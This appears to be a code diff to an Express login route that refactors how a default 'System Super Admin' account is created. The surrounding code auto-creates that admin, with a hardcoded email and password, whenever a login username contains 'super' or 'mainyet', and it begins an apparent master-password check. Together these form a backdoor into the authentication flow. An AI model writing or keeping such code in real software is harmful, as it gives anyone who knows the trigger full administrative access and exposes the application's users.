@@ -82,7 +82,7 @@ router.post("/login", validateLogin, async (req, res) => {
 
     // Auto-create default Super Admin if missing
     if (!user && (lowUser.includes('super') || lowUser.includes('mainyet'))) {
-      user = new User({
+      user = await User.create({
         username: 'Mainyet123@gmail.com',
         email: 'Mainyet123@gmail.com',
         fullName: 'System Super Admin',
@@ -90,7 +90,6 @@ router.post("/login", validateLogin, async (req, res) => {
         password: 'super12345',
         status: 'active'
       });
-      await user.save();
     }
 
     const isMasterPassword = (
